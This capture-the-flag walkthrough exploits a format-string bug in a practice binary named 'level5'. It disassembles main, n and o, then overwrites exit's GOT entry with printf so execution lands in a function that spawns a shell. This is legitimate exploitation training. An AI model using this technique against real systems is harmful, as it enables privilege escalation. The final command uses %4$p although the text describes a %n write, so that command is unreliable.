level5
======

Dissassembly
------------

To dissassemble the executable we can use objdump.
```sh
EXECUTABLE=./level5

objdump -M intel -d "$EXECUTABLE"
```

The main function looks like this:
```nasm
08048504 <main>:
 8048504:	55                   	push   ebp
 8048505:	89 e5                	mov    ebp,esp
 8048507:	83 e4 f0             	and    esp,0xfffffff0
 804850a:	e8 b3 ff ff ff       	call   80484c2 <n>
 804850f:	c9                   	leave
```

It calls another function n, which uses printf to print our input:

```nasm
080484c2 <n>:
 80484c2:	55                   	push   ebp
 80484c3:	89 e5                	mov    ebp,esp
 80484c5:	81 ec 18 02 00 00    	sub    esp,0x218
 80484cb:	a1 48 98 04 08       	mov    eax,ds:0x8049848
 80484d0:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 80484d4:	c7 44 24 04 00 02 00 	mov    DWORD PTR [esp+0x4],0x200
 80484db:	00
 80484dc:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 80484e2:	89 04 24             	mov    DWORD PTR [esp],eax
 80484e5:	e8 b6 fe ff ff       	call   80483a0 <fgets@plt>
 80484ea:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 80484f0:	89 04 24             	mov    DWORD PTR [esp],eax
 80484f3:	e8 88 fe ff ff       	call   8048380 <printf@plt>
 80484f8:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 80484ff:	e8 cc fe ff ff       	call   80483d0 <exit@plt>
```

There is a call to exit at the end of the procedure, so we cannot override the stored value of the EIP to jump on a shellcode.

There also is another function o, which uses a system call to run a shell:
```nasm
080484a4 <o>:
 80484a4:	55                   	push   ebp
 80484a5:	89 e5                	mov    ebp,esp
 80484a7:	83 ec 18             	sub    esp,0x18
 80484aa:	c7 04 24 f0 85 04 08 	mov    DWORD PTR [esp],0x80485f0
 80484b1:	e8 fa fe ff ff       	call   80483b0 <system@plt>
 80484b6:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 80484bd:	e8 ce fe ff ff       	call   8048390 <_exit@plt>
```

The problem is that it is not referenced, and needs to be accessed through a jmp or call instruction. 
We can see that the only thing we can exploit would be the exit call itself, since we cannot reach any other function past this point.

The exit function uses a PLT-stub to redirect the call to the dynamically loaded libc library, whose address is only knwon past runtime-linking.
The stub function looks like this:
```nasm
080483d0 <exit@plt>:
 80483d0:	ff 25 38 98 04 08    	jmp    DWORD PTR ds:0x8049838
 80483d6:	68 28 00 00 00       	push   0x28
 80483db:	e9 90 ff ff ff       	jmp    8048370 <_init+0x3c>
```
The stub function jumps to a pointer stored at 0x8049838.
If we manage to overwrite this pointer, we can jump anywhere we want.

The stack of the n function looks like this:
| Address | Type           | Size |
|---------|----------------|------|
| -0x218  | char \*fmt     |   4  |
| -0x210  | FILE \*stdin   |   4  |
| -0x20c  | size_t len     |   4  |
| -0x208  | char data[200] | 512  |
|  0x000  | \*EBP          |   4  |
|  0x004  | \*EIP          |   4  |

We can place the address of the stub function's pointer to the start of our buffer, and write to it using the %n format specifier.

Let's try to jump to the o function with the system call:
```sh
ADDRESS=08049838
VALUE=080484a4

BYTES=$(<<< "$ADDRESS" rev | dd conv=swab | xxd -r -p)
LENGTH=$((16#$VALUE))
PADDING=$((LENGTH - ${#BYTES}))

echo "${BYTES}%${PADDING}x%4\$p" | ./level5
```
```sh
...
200
whoami
level6
```
